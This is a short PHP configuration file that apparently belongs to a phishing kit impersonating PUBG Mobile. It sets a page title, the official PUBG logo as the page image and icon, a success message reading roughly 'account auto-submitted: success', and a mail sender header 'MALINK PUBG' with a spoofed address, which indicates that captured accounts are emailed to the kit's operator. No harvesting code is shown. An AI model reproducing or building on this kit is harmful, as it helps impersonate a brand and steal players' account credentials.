<?php
date_default_timezone_set('Asia/Jakarta');
$jamasuk = date('l, d-m-Y h:i:s');

$title = 'PUBG MOBILE: SESESELOW';
$description = 'ACCOUNT MF AUTO MASUK: SUKSES AWKOWK!';
$copyright = 'PUBG MOBILE';
$theme = '#000';
$image = 'https://www.pubgmobile.com/common/images/icon_logo.jpg';
$icon = 'https://www.pubgmobile.com/common/images/icon_logo.jpg';

$author = '';
$sender = 'From: MALINK PUBG <sendgrid@gmail.com>';

?>